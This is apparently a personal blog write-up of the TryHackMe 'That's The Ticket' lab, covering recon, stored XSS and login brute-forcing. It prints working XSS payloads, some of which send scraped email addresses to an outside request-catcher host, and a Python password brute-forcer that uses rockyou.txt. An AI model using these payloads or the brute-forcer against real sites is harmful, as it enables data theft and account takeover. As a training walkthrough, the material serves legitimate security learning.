---
layout: default
title: "That's The Ticket Writeup - TryHackMe"
image: /assets/images/thatstheticket.png
tags: [tryhackme, ctf-writeup]
read_time: "9 min read"
---

# That's The Ticket Writeup - TryHackMe

## IT Support are going to have a bad day, can you get into the admin account?

Happy New Year’s! Few days before the end of 2024 I sat down to take on my final challenge of the year, this time going with a medium level room. This one has been sitting in my saved rooms for a while and I really wanted to give it a try. This room consisted of challenging the users understanding of XSS, HTTP and DNS logging, and how to brute force a login page to be able to complete it. It was a lot of fun but also quite challenging, as well as a great opportunity to practice some skills I learned previously in school. I hope you enjoy the writeup and walkthrough, and if you’re currently working through the room, I hope this is helpful.

---

## Reconnaissance

Like I do with any challenge, I started off by pinging the machine and running an Nmap scan using the command, `nmap -sV -T4 10.10.154.106`. -sV is used for service detection and -T4 is used for timing, it’s fast but maintains reasonable accuracy of the scan. The results of the scan came back showing port 22 and port 80 both being open.

![](/assets/images/ticketPic1.png)

For the room being related to presumably a ticket system, it made sense in having port 80 open, so from here I searched the IP address in my browser. This did in fact direct me to a Ticket Manager homepage. On this page there were only two options of where to go next, a login page and a register page. This page was very simple and didn’t have much on it.

![](/assets/images/ticketPic2.png)

Before continuing to investigate the website, I started running gobuster using the command, `gobuster dir -u` [`http://10.10.154.106`](http://10.10.154.106) `-w /usr/share/wordlists/dirbuster/directory-list-1.0.txt`. Through the entire time of it running it kept returning results of directories with the name of numbers with the status code 302. There were a few with the status 200 within the first 25% but those were for the login and register pages, which were to be expected because of what we could see on the homepage.

![](/assets/images/ticketPic3.png)

Back on the website before checking out more of what I could see in plain sight, I skimmed through the page source to look for any possible hidden information that might reveal tips or hints for solving the room. I didn’t find anything useful here, so I just moved onto checking out the login and register pages. They also looked quite simple like the homepage and nothing looked out of place or suspicious in the source code. I quickly registered for the site, which then directed me to the dashboard. Again, the style and look of the site was very similar to the previous pages we have seen.

![](/assets/images/ticketPic4.png)

![](/assets/images/ticketPic5.png)

## Active Enumeration

Seeing that the dashboard included a text area immediately made me think of testing it to see if it was vulnerable to XSS (Cross Site Scripting) attacks. I did this by testing out a few different payloads, if it’s vulnerable to any of the payloads, it will trigger an alert box saying XSS.

* `<script>alert('XSS');</script>`
    
* `<img src=x onerror=alert('XSS')>`
    
* `" onmouseover="alert('XSS');`
    

The first one was more of a simple test, and if that one didn’t work I would move onto the other two which were an attempt to bypass any filters in the code. Unfortunately none of them worked so I went back to the first ticket to see how the website looked in response to the payload and to see how the source code handled it.

![](/assets/images/ticketPic6.png)

![](/assets/images/ticketPic7.png)

The ticket itself held nothing special but the source code revealed how the text area is handled, meaning just a little bit of tweaking to that first payload could successfully exploit the vulnerability. By adding `</textarea>` to the beginning of the payload closed the initial text area tag allowing for the alert tag to be triggered. Submitting the updated payload gave us the alert and looking at the source code of that tickets page showed us what we were expecting to see.

![](/assets/images/ticketPic8.png)

![](/assets/images/ticketPic85.png)

## Exploitation

Being able to trigger that alert is very important for moving forward, now we know how to exploit the websites vulnerability to XSS and we can combine it with the HTTP and DNS logging tool hinted at in the rooms task.

Tweaking the above command to combine the request catchers’ domain will hopefully get us some output on the catcher page. The first payload I tried was, `</textarea><img src=”http://4a80c9fda31d443bafea9a0868b9b7ae.log.tryhackme.tech”>`. It didn’t look like it had worked as I wasn’t getting anything in the request catcher site so I adjusted the payload to, `</textarea><img src=x onerror=”location=’http://4a80c9fda31d443bafea9a0868b9b7ae.log.tryhackme.tech/’”>`, which did give me some output.

![](/assets/images/ticketPic9.png)

Successfully getting an output here means we can move onto find useful information like the email address for the IT Support which is the first question of the room. The first payload I tried returned the test email I used to signup but it looked to have replaced the @ symbol with the string %40.

```javascript
</textarea> <script> 
    var emails = document.body.innerText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+.[a-zA-Z]{2,}/g); 
    if (emails) { 
        new Image().src = 'http://4a80c9fda31d443bafea9a0868b9b7ae.log.tryhackme.tech/?emails=' + encodeURIComponent(emails.join(','));
    }
</script>
```

![](/assets/images/ticketPic10.png)

Changing the above payload to look something like below to filter out the test email also didn’t work. From there I changed the URL to try a subdomain and then merge the two in a couple different ways but it still wasn’t really working, so I moved onto trying a different payload.

```javascript
</textarea> <script> 
    var emails = document.body.innerText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+.[a-zA-Z]{2,}/g); 
    if (emails) { 
        var filteredEmails = emails.filter(email => email !== '1234@1234.com'); 
        if (filteredEmails.length > 0) { 
            new Image().src = 'http://4a80c9fda31d443bafea9a0868b9b7ae.log.tryhackme.tech/?emails=' + encodeURIComponent(filteredEmails.join(','));
        }
    }
</script>
```

```javascript
</textarea> <script> 
    var emails = document.body.innerText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g); 
    if (emails) { 
        new Image().src = 'http://TEST.4a80c9fda31d443bafea9a0868b9b7ae.log.tryhackme.tech/?emails=' + encodeURIComponent(emails.join(','));
    }
</script>
```

I realized I was probably making my payloads for this way too complex so I went with a more simple looking payload, and after entering it in a ticket and sifting through the results I was able to find the email.

```javascript
</textarea> <script>
    var email = document.getElementById("email").innerText;
    email = email.replace("@", "8")
    email = email.replace(".", "0")
    document.location = "http://"+ email +".4a80c9fda31d443bafea9a0868b9b7ae.log.tryhackme.tech"
</script>
```

![](/assets/images/ticketPic11.png)

Once I found the admin email, there wasn’t too much more work to do besides brute forcing the login page to find the IT supports’ password and then using it to find the flag in the first ticket. For brute forcing the email to get the accounts password you can ether use tools like Hydra, Burpsuite, or WFuzz, or you can write or find a python script that automates that process.

I went with writing a quick script because I enjoy making automation scripts like this, and even if they sometimes take longer to write than using another tool, it’s a good way to test my programming skills and understanding. The below code predefines the URL, email, and the chosen wordlist file at the top of the program. For each password from the chosen wordlist, it checks its length before creating the payload and sending a post request. Then it checks the status code and length of response to determine the successful password. Finally, it prints out the password to the user.

```python
import requests

url = "http://10.10.244.231/login"                    # replace with the correct IP address
email = "filler_email@ticket.thm"                     # replace with the admin email address
password_list = "/usr/share/wordlists/rockyou.txt"    # the wordlist file path
correct_password = None                               # set the correct password to none

with open(password_list, "r", encoding="utf-8", errors="ignore") as f:    # read the password list
    passwords = f.readlines()

for password in passwords:
    password = password.strip()
    if len(password) != 6:                         # password length must be 6, known from the challenge
        continue                                   # move onto next password
    data = {"email": email, "password": password}  # update payload with the email and current password

    try:
        response = requests.post(url, data=data, allow_redirects=False)   # check for redirects
    except requests.RequestException as e:
        print(f"Error with password {password}: {e}")                     # print password that had an issue
        continue

    if response.status_code == 302:                    # redirect indicates success
        correct_password = password
        print(f"Password found: {correct_password}")   # print the stored password
        break                                          # exit for loop if found
    elif len(response.text) < 350:                     # alternative check for response size
        correct_password = password
        print(f"Password found (based on response size): {correct_password}")
        break                                          # exit for loop if found

if correct_password:                                   # check if correct password was found
    print(f"Correct password: {correct_password}")     # print the stored password
else:
    print("Password not found.")
```

P.S. if you’re interested in seeing more scripts I make or find, I’ve started a GitHub repository where I store and keep track of these files and the challenges they were used in, [**GitHub - cDenton1/extra\_ctf\_files**](https://github.com/cDenton1/extra_ctf_files/tree/main).

After running it a few times and troubleshooting a few spelling errors, it takes a few seconds to run but it spits out the password for the email. This is the answer to the second question of the room. Then taking that password and plugging it into the login page along with the supports’ email, gives us access to the account. Lastly we can view the first ticket, giving us the flag and the final answer of the challenge.

![](/assets/images/ticketPic12.png)

---

## Extra Findings

When I first got to the website used for this challenge, before investigating further into it, I skimmed through the page source to look for any possible hidden information for the room. I didn’t find anything useful here and what I did find held no importance to the task at hand, but I thought it was pretty interesting as I have never seen anything like it.

![](/assets/images/ticketPic13.png)

In the head section of HTML source code, in the link tag, there is an attribute called, integrity. Looking into this, I found out it is a security feature used by web developers to ensure the resource hasn't been tampered with and is part of a feature called Subresource Integrity (SRI). Anyone who has worked more with websites or has more experience with pentesting, most likely has seen this before, but this was the first I have ever noticed this attribute in a websites source code and it caught my eye.

---

## Conclusion

This was a fun room and wasn’t super long either, especially once I found the email. I spent the most time testing out different payloads on the text area and just experimenting with it, which was something I definitely needed some practice with since it has been while since I’ve done anything with XSS. I also haven’t done anything with HTTP and DNS logging tools before so figuring out how to get it to catch requests initially had taken some time. It was a great challenge overall and wasn’t super confusing on where to go or what to do next. If you want to check it out I’d recommend it, [https://tryhackme.com/r/room/thatstheticket](https://tryhackme.com/r/room/thatstheticket).
